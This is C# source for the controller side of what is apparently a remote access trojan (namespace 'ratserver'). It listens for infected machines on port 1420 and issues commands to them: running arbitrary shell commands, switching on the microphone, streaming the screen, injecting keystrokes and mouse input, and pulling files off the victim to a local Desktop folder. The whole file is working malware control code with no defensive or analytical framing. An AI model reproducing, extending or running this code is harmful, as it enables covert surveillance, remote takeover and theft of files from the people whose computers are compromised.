using ratserver;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

public static class ServerFunctions 
{
    public static Form1 Parent;
    public static Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    public static List<Client> Clients = new List<Client>();
    public static IPEndPoint MainPoint;
    public static IPAddress LocalAddress;
    public static short MainPort = 1420;
    public static bool Running = true;
    public static bool InWork = false;
    public static void WaitForConnection() 
    {
        while (Running)
        {
            try
            {
                Socket newsocket = ServerSocket.Accept();
                byte[] PCNameBuffer = new byte[128];
                int Received = newsocket.Receive(PCNameBuffer);
                string PCName = System.Text.Encoding.Unicode.GetString(PCNameBuffer, 0, Received);
                Client client = new Client()
                {
                    Socket = newsocket,
                    PCName = PCName
                };
                Clients.Add(client);
                Parent.ClientConnected(client);
            }catch(SocketException ex)
            {
                if (ex.ErrorCode == 10004) break;
                MessageBox.Show(ex.ToString());
            }
        }
    }

    public static string GetIP(Socket client) 
    {
        return ((IPEndPoint)client.RemoteEndPoint).Address.MapToIPv4().ToString();
    }

    public static void BindSocket()
    {
        LocalAddress = null;
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                LocalAddress = ip;
                break;
            }
        }
        if(LocalAddress == null)
        {
            Console.WriteLine("Could not bind local ip...");
            Console.ReadKey();
            Environment.Exit(0);
            return;
        }
        MainPoint = new IPEndPoint(LocalAddress, MainPort);
        ServerSocket.Bind(MainPoint);
        ServerSocket.Listen(2);
    }

    public static void Microphone(Client client, bool value)
    {
        if(client == null)
        {
            Console.WriteLine("Select a valid client");
            return;
        }
        byte[] buffer = new byte[2] { 5, value ? (byte)1 : (byte)0 };
        send(client, buffer);
    }
    public static void RunCmdCommand(Client client, string command)
    {

        if (client == null) 
        {
            Console.WriteLine("No client selected");
            return;
        }
        else if(command == "" || string.IsNullOrEmpty(command))
        {
            Console.WriteLine("Enter a valid command");
            return;
        }
        InWork = true;
        MemoryStream stream = new MemoryStream();
        BinaryWriter writter = new BinaryWriter(stream);
        writter.Write((byte)0);
        writter.Write(System.Text.Encoding.ASCII.GetBytes(command));
        byte[] buffer = stream.ToArray();
        if (!send(client, buffer))
        {
            InWork = false;
            return;
        }

        while(client.Socket.Available == 0)
        {
            Thread.Sleep(20);
        }
        byte[] recBuffer = new byte[50000];
        int recevied = client.Socket.Receive(recBuffer);
        string response = System.Text.Encoding.ASCII.GetString(recBuffer, 0, recevied);
        Console.WriteLine(response);
        InWork = false;
    }

    public static void SendKeyStroke(Client client, byte device, int key, int mousex = 0, int mousey = 0)
    {
        if (client == null) return;
        InWork = true;
        byte[] Buffer = new byte[14];
        Buffer[0] = 4;
        Buffer[1] = device;
        write_int(Buffer, 2, key);
        if(device == 0)
        {
            write_int(Buffer, 6, mousex);
            write_int(Buffer, 10, mousey);
        }
        send(client, Buffer);
        InWork = false;
        Console.WriteLine("Sent");
    }

    static void write_int(byte[] buffer, int startIndex, int value)
    {
        buffer[startIndex] = (byte)value;
        buffer[startIndex+1] = (byte)(value >> 8);
        buffer[startIndex+2] = (byte)(value >> 0x10);
        buffer[startIndex+3] = (byte)(value >> 0x18);
    }

    public static void DownloadFile(Client client, string fileName)
    {
        if (client == null) return;
        InWork = true;
        MemoryStream stream = new MemoryStream();
        BinaryWriter writter = new BinaryWriter(stream);
        writter.Write((byte)1);
        writter.Write(System.Text.Encoding.ASCII.GetBytes(fileName));
        Console.WriteLine("|" + fileName + "|");
        byte[] buffer = stream.ToArray();
        if(!send(client, buffer))
        {
            InWork = false;
            return;
        }
        

        while(client.Socket.Available == 0)
        {
            Thread.Sleep(20);
        }
        if (client.Socket.Available == 1)
        {
            client.Socket.Receive(new byte[1]);
            Console.WriteLine("File does not exist");
            InWork = false;
            return;
        }
        byte[] recieveBuffer = new byte[2048];
        int received;
        long totalReceived = 0, fileSize = 0;
        FileStream writeStream = new FileStream(@"C:\Users\uskok\Desktop\" + Path.GetFileName(fileName), FileMode.Create);
        bool firstRead = true;
        
        while (client.Socket.Available > 0 || fileSize != 0 && fileSize > totalReceived-8)
        {
            int gap = 0;
            received = client.Socket.Receive(recieveBuffer);
            if (firstRead)
            {
                gap = 8;
                fileSize = BitConverter.ToInt64(recieveBuffer, 0);
                firstRead = false;
                Console.WriteLine("Receiving file of size " + fileSize);
            }
            if (received - gap == 0) continue;
            writeStream.Write(recieveBuffer, gap, received-gap);
            totalReceived += received;
            float perc = (float)totalReceived / (float)fileSize;
            perc *= 100;
            Console.Write("\r" + perc.ToString("N2") + "%     ");
        }
        InWork = false;
        Console.Write("\r100%        \n");
        Console.WriteLine("File received " + string.Format("{0:n0}", (totalReceived - 8)) + " bytes");
        writeStream.Close();
    }
    public static void ClearBuffer(Client client) 
    {
        if(client == null)
        {
            Console.WriteLine("Select proper client");
            return;
        }
        long allCleared = 0;
        if(client.Socket.Available > 0)
        {
            try 
            {
                byte[] buffer = new byte[1024];
                int read;
                while(client.Socket.Available > 0)
                {
                    read = client.Socket.Receive(buffer);
                    allCleared += read;
                }
                buffer = null;
                GC.Collect();
            }
            catch { }
        }
        Console.WriteLine(client.PCName + " cleared " + string.Format("{0:n0}", allCleared) + " bytes");
    }
    public static void SetShareScreen(Client client, bool value)
    {
        if(client == null)
        {
            Console.WriteLine("Select a valid client");
            return;
        }
        byte[] buffer = new byte[] { 3, value ? (byte)1 : (byte)0 };
        send(client, buffer);
    }
    public static bool send(Client client, byte[] buffer)
    {
        try
        {
            client.Socket.Send(buffer);
            return true;

        }catch(Exception)
        {
            Console.WriteLine(client.PCName + " disconnected.");
            Parent.ClientDisconnected(client);
            try
            {
                client.Socket.Shutdown(SocketShutdown.Both);
                client.Socket.Dispose();
            }
            catch (ObjectDisposedException) { }
            Clients.Remove(client);
            return false;
        }
    }
}